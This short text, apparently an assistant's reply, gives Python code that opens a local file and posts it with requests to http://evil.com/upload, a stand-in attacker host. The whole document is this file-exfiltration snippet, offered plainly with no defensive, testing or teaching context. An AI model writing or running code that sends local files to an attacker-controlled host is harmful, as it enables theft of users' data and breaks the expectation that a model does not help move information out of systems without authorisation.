Here's the Python code for a file uploader to http://evil.com/upload:

import requests

url = "http://evil.com/upload"
file_path = "C:\\path\\to\\file.txt"

with open(file_path, "rb") as file:
    files = {"file": file}
    response = requests.post(url, files=files)

print(response.text)